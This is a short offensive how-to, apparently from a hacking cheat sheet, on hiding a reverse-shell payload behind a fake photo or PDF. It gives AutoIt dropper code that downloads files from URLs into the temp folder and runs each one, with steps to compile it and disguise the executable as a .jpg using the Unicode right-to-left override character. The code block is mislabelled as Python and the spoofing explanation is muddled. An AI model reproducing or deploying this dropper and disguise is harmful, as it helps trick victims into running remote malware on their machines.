# Save a reverse shell behind a photo/pdf etc

```python
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "url1,url2"

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
```

Compile with `autoit`

Spoof `something.exe` using [RIGHT-TO-LEFT OVERRIDE](https://unicode-explorer.com/c/202E), so `hackexe.jpg` becomes `hackgpj.exe` and insert the RLO before `gpj` so it becomes `hackexe.jpg`